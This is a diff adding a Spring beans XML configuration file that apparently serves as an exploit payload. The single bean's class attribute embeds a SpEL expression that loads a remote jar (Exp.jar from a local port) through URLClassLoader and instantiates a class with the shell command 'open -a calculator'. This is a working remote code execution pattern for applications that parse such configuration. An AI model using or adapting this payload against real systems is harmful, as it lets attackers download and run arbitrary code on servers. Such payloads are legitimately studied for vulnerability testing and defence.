@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:spring="http://camel.apache.org/schema/spring"
+       xmlns:context="http://www.springframework.org/schema/context"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">
+    <context:property-placeholder ignore-resource-not-found="false" ignore-unresolvable="false"/>
+
+    <bean  class="#{new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8999/Exp.jar')}).loadClass('Exec').getConstructors()[0].newInstance('open -a calculator')}" >
+
+    </bean>
+</beans>
